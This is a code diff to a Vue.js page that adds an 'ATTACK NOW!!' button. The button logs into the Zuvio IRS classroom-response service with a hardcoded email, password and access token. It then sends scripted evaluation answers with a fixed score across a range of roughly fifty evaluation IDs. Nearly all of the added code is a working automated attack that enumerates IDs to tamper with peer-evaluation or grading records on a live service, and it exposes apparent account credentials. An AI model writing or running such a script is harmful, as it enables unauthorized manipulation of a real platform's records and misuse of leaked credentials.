@@ -35,6 +35,7 @@
             x-large
             color="success"
             dark
+            @click="attackClicked"
             >ATTACK NOW!!</v-btn
           >
         </v-card-actions>
@@ -46,10 +47,62 @@
 <script>
 // @ is an alias to /src
 const mainImage = () => import("@/components/mainImage");
+import Axios from "axios";
+Axios.defaults.withCredentials = true;
+const api = Axios.create({
+  baseURL: "https://irs.zuvio.com.tw/",
+  headers: {
+    referer:
+      "https://irs.zuvio.com.tw/student5/irs/evaluation/7308955/2761672/",
+    origin: "https://irs.zuvio.com.tw",
+    "Content-Type": "application/json"
+  },
+  withCredentials: true
+});
 export default {
   name: "home",
   components: {
     mainImage
+  },
+  data: () => ({
+    attackStatus: false
+  }),
+  methods: {
+    attackClicked() {
+      if (!this.attackStatus) {
+        this.loginGET();
+        this.loginPOST();
+        for (let i = 2761670; i <= 2761720; i++) {
+          this.attackPOST(i);
+        }
+      }
+    },
+    async loginGET() {
+      await api.get("/irs/login");
+    },
+    async loginPOST() {
+      let bodyFormData = new FormData();
+      bodyFormData.append("email", "t108820039@ntut.edu.tw");
+      bodyFormData.append("password", "123");
+      await api.post("/irs/submitLogin", bodyFormData);
+    },
+    async attackPOST(i) {
+      let answers = [{ id: "400875", answer: "test87", score: 4 }];
+      let my_data = {
+        url: "https://irs.zuvio.com.tw" + "/app_v2/answerEvaluation",
+        type: "POST",
+        data: {
+          user_id: 2038529,
+          accessToken: "2f308705618ccf7c6046aa2f45b719365c7a0908",
+          question_id: 7308955,
+          evaluation_id: i,
+          answers: answers,
+          device: "STUDENT_WEB"
+        },
+        dataType: "json"
+      };
+      await $.ajax(my_data);
+    }
   }
 };
 </script>
